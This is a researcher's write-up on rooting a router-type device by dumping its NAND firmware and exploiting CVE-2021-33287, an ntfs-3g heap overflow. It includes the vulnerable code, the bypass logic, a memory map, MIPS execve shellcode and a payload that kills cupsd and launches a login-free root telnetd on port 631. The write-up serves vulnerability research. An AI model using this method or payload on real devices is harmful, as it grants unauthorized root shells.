## Technical writeup

### First things first

To make this research possible I first had to get the firmware image to analyze. Unforunately the firmware isn't available on the internet. This meant I had to extract it myself.

### Extracting the firmware

My first thought was that rooting this device would just require connecting to the serial port on the board and a linux shell would probably be accessible. I was wrong. Not even interrupting the bootloader - u-boot, worked.

This left reading the NAND directly as my next best bet.

### ... directly from the NAND

To read the NAND i've [used the ftdi chip](https://spritesmods.com/?f=had&art=ftdinand).

I won't go into too much details about extracting the firmware images as you can find more info in my [mati7337/orange-config](https://github.com/mati7337/orange-config) repo.

### The vulnerability

This exploit uses CVE-2021-33287, which got patched by adding more attribute consistency checks.

This vulnerability is a heap overflow that happens due to an integer overflow when reading and writing attributes. Calling it a heap overflow might be kind of an understatement, as you can specify both the length and an offset. The offset can even point to the memory before the buffer by overflowing the address.

The vulnerability is in the ntfs_attr_pread_i and ntfs_attr_pwrite functions.

Let's look at the vulnerable code from `ntfs_attr_pread_i`

```C
val = (char*)ctx->attr + le16_to_cpu(ctx->attr->value_offset);
if (val < (char*)ctx->attr || val +
		le32_to_cpu(ctx->attr->value_length) >
		(char*)ctx->mrec + vol->mft_record_size) {
	errno = EIO;
	ntfs_log_perror("%s: Sanity check failed", __FUNCTION__);
	goto res_err_out;
}
memcpy(b, val + pos, count);
```

The overflow happens when adding val + pos in the memcpy line. The type of pos is s64, which is typedefed as int64_t, and it's a value passed by the user when reading the file. So e.g. if val is 0x13 and pos is 0xffffffff the resulting pointer will be 0x12.

The problem with this is that pos has to be < value length. This makes sense, as users shouldn't be able to read beyond attribute's data.

Sanity check verifies that val + value_length > mrec + mft_record_size, so there is a size limit for attribute value, so we can't go beyond the mft record size. Or can we? We actually can overflow that as well. It only checks if the start of value is after beginning of attribute and end is before the end, but with this trick we have an attribute that ends before the beginning, so we pass these checks.

Even though kernel.randomize_va_space is set to 2, only the stack address seems to be randomized, so to get to it we need to find a pointer to it elsewhere. Luckily there's mount_dst string pointer in the data section of ntfs-3g at 0x41c610 which points to the stack.

The problem is that even though `exploit.c` uses pread which can be used to read only 4 bytes, ntfs-3g still tries to read a 4096 byte block. This starts to be a problem when reading unallocated memory, as it segfaults the program. My solution to this is to read memory from the ntfs-3g elf file and calculate a correct attribute offset for the reads to be page aligned. The problem is that the address where the buffer we write/read data to/from can change position. This means that sometimes it's necessary to unplug and plug back the usb stick, but most of the times it works without problems

Here's what the memory map of ntfs-3g looks like

```
00400000-0040d000 r-xp 00000000 1f:0a 325        /bin/ntfs-3g
0041c000-0041d000 rw-p 0000c000 1f:0a 325        /bin/ntfs-3g
0041d000-00482000 rwxp 00000000 00:00 0          [heap]
2aaa8000-2aaad000 r-xp 00000000 1f:0a 1897       /lib/ld-uClibc.so.0
2aaad000-2aaae000 rw-p 00000000 00:00 0
2aabc000-2aabd000 r--p 00004000 1f:0a 1897       /lib/ld-uClibc.so.0
2aabd000-2aabe000 rw-p 00005000 1f:0a 1897       /lib/ld-uClibc.so.0
2aabe000-2ab39000 r-xp 00000000 1f:0a 1872       /lib/libntfs-3g.so.49.0.0
2ab39000-2ab48000 ---p 00000000 00:00 0
2ab48000-2ab4a000 rw-p 0007a000 1f:0a 1872       /lib/libntfs-3g.so.49.0.0
2ab4a000-2ab56000 r-xp 00000000 1f:0a 1806       /lib/libpthread.so.0
2ab56000-2ab65000 ---p 00000000 00:00 0
2ab65000-2ab66000 r--p 0000b000 1f:0a 1806       /lib/libpthread.so.0
2ab66000-2ab6b000 rw-p 0000c000 1f:0a 1806       /lib/libpthread.so.0
2ab6b000-2ab6d000 rw-p 00000000 00:00 0
2ab6d000-2ab97000 r-xp 00000000 1f:0a 1912       /lib/libgcc_s.so.1
2ab97000-2aba7000 ---p 00000000 00:00 0
2aba7000-2aba8000 rw-p 0002a000 1f:0a 1912       /lib/libgcc_s.so.1
2aba8000-2ac01000 r-xp 00000000 1f:0a 1893       /lib/libc.so.0
2ac01000-2ac10000 ---p 00000000 00:00 0
2ac10000-2ac11000 r--p 00058000 1f:0a 1893       /lib/libc.so.0
2ac11000-2ac12000 rw-p 00059000 1f:0a 1893       /lib/libc.so.0
2ac12000-2ac17000 rw-p 00000000 00:00 0
7f913000-7f928000 rwxp 00000000 00:00 0          [stack]
```

After this the process was pretty straight forwards, as the stack is marked as executable. `exploit.c` overwrites the return pointer from fuse_loop and sets it to a stack address where we write our shellcode.

After accidentally trying to use x86 syscalls on mips and failing miserably I came up with the following:

```
li $v0, 4011;       # SYS_EXECVE
li $a0, 0x00000000; # char *const pathname
li $a1, 0x00000000; # char *argv[]
li $a2, 0x00000000; # char *const envp[]
syscall
```

The null pointers are changed from exploit.c to the actual addresses on stack by `exploit.c`.

Another problem is that I couldn't connect to the telnet server. It turns out that incoming connections to other ports are blocked even from the LAN. I solved it by stealing the 631 port from cupsd by killing it.

Here's the final payload that gets passed to SYS_EXECVE:

```shell
sh -c "killall -SIGKILL cupsd ; telnetd -l /bin/sh -p 631 -b 192.168.1.1 -F"
```

After correctly modifying data on the stack we can finally unmount the usb stick, either from the interface or by physically unplugging the drive. This will activate the shellcode, kill cupsd and run telnetd on port 631.
